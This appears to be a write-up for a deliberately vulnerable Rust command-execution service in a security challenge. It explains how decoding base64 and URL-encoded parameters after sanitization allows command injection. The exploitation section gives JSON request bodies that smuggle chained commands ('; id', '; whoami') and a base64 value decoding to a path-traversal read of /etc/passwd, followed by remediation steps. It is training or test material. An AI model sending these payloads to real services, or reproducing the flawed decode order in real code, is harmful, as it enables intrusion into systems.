# Challenge 33: Command Injection via Parameter Substitution and Encoding Bypass

## Vulnerability
This Rust application implements a secure-looking command execution service with multiple layers of validation, but contains subtle vulnerabilities in parameter substitution and encoding handling that allow command injection.

## Locations and Issues

### 1. Parameter Substitution Logic Flaw
`src/main.rs` lines 94-98:
```rust
for (key, value) in &sanitized_params {
    let placeholder = format!("{{{}}}", key);
    full_command = full_command.replace(&placeholder, value);
}
```

### 2. Base64 Encoding Bypass 
`src/main.rs` lines 104-111:
The application decodes base64 parameters after initial sanitization, allowing injection of dangerous characters.

### 3. URL Encoding Bypass
`src/main.rs` lines 113-119:
Similar issue with URL decoding happening after sanitization.

## Impact
- Remote Command Execution despite multiple validation layers
- Bypass of command allowlisting through parameter injection
- Information disclosure and system compromise

## Why It's Hard to Detect
- Multiple security layers appear comprehensive
- Command validation looks robust with regex patterns and allowlisting
- Parameter sanitization removes dangerous characters
- The vulnerability is in the order of operations and encoding handling
- Static analyzers would struggle with the complex flow between functions
- Written in Rust, which has a reputation for memory safety (not logic safety)

## Exploitation

### Vector 1: Base64 Encoding Bypass
POST to `/api/execute`:
```json
{
  "command": "echo {payload}",
  "parameters": {
    "payload": "dGVzdDsgaWQ="
  },
  "encoding": "base64"
}
```

The base64 `dGVzdDsgaWQ=` decodes to `test; id`, bypassing the character sanitization.

### Vector 2: URL Encoding Bypass
POST to `/api/execute`:
```json
{
  "command": "echo {cmd}",
  "parameters": {
    "cmd": "hello%3B%20whoami"
  },
  "encoding": "url"
}
```

The URL encoded `%3B%20` becomes `; ` after decoding, allowing command chaining.

### Vector 3: Complex Parameter Substitution
POST to `/api/execute`:
```json
{
  "command": "ls {dir}",
  "parameters": {
    "dir": "Li4vLi4vZXRjL3Bhc3N3ZA=="
  },
  "encoding": "base64"
}
```

This decodes to `../../etc/passwd`, potentially causing path traversal.

## Remediation
1. Perform encoding/decoding before parameter sanitization
2. Use proper command builders instead of string substitution
3. Implement strict parameter validation after decoding
4. Use process execution libraries that prevent shell injection
5. Apply defense in depth with proper sandboxing
6. Never trust user input even after apparent sanitization
